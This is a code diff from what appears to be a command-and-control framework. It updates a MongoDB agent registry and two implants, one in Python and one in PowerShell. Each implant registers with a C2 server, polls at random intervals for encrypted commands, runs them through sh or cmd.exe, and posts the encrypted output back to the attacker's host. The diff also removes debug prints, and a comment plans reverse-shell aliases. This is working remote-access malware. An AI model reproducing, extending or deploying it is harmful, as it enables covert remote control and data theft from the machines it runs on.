@@ -10,22 +10,20 @@ To-Do:
 2- Delete the task after writing its result
 '''
 
-def registerAgent(agentID, BindlistenerId, timeout=86400):
+def registerAgent(agentID, type, bindListenerID, ip, port, timeout=86400):
 
-    agent = {'id': agentID,
-             'timeout': timeout,
-             'ip': '',
-             'task': '',
+    agent = {'id': agentID, 
+             'port': port,
+             'type': type,
              'status': 'dead',
+             'task': '',
              'taskResult': '',
-             'BindlistenerId': BindlistenerId 
+             'bindListenerID': bindListenerID,
+             'serverIP': ip, 
+             'timeout': timeout
              }
 
     db.agents.insert_one(agent)
-
-
-def getAgents():
-    return db.agents.find()
 
 
 def deleteAgent(agentID):
@@ -113,9 +111,10 @@ def getAgentListener(agentID):
     return db.agents.find_one({
         'id': {
             '$eq': agentID}
-    }).get('BindlistenerId')
+    }).get('bindListenerID')
 
-
+def getAgents():
+    return db.agents.find()
 
 def login(email, password): 
     if db.operators.find_one({'email': {'$eq': email}, 'password': {'$eq': sha256(password.encode('utf-8')).hexdigest()}}): 
@@ -174,7 +173,6 @@ if __name__ == "__main__":
         seed()
         sleep(randint(0,20)) 
         response = r.get(url= _C2_ + "/reg/{}".format(_ID_)) 
-        print(response.text)
         
         if ("Success" in response.text): 
             break 
@@ -190,13 +188,10 @@ if __name__ == "__main__":
         #add aliases for reverse shell and purging  
         if (task.text): 
             #decrypting data bfore executing command
-            print(task.text)
             cmd = decrypt(task.text)
-            print(cmd)
             result = encrypt(os.popen('echo "{}" | sh'.format(cmd)).read())
-            print(result)
             if (result == ''): 
-                result = "Task completed but has no output"
+                result = encrypt("Task completed but has no output")
             
             r.post(url= _C2_ + '/task/results/{}'.format(_ID_), data = result.encode('ascii')) 
          
@@ -248,30 +243,39 @@ function Decrypt-String($key, $encryptedStringWithIV) {
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
     $aesManaged.Dispose()
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
+    
+}
+function Convert-ASCII($ascii) {
+	$letter = @()
+	foreach ($char in $ascii){
+	$char = [int[]]$char
+	$letter += [char[]]$char
+	}
+	$final = ("$letter").Replace(" ","")
+	Return $final
 }
 
 $ip = "REPLACE_IP"
 $port = "REPLACE_PORT"
 $id = "REPLACE_ID"
-$key = "KEY"
+$key = "REPLACE_KEY"
 $reguri = ("http" + ':' + "//$ip" + ':' + "$port/reg/$id")
 $name = (Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'GET').Content
-
-
+$name=Convert-ASCII($name)
+$name
 if ($name -eq "Success"){
 $taskuri = ("http" + ':' + "//$ip" + ':' + "$port/task/$id")
 $responseuri = ("http" + ':' + "//$ip" + ':' + "$port/task/results/$id")
 for (;;) {
 $n  = Get-Random -Maximum 20
 $task = (Invoke-WebRequest -UseBasicParsing -Uri $taskuri  -Method 'GET').Content
-
+$task=Convert-ASCII($task)
 if ($task -ne "0") {
 
 $dtask = Decrypt-String $key $task
 $res = cmd.exe /c $dtask
-
 $data = Encrypt-String $key $res
-$data = "results= $data"
+$data = "$data"
 $response = (Invoke-WebRequest -UseBasicParsing -Uri $responseuri -body $data -Method 'POST').Content
     }
 sleep $n
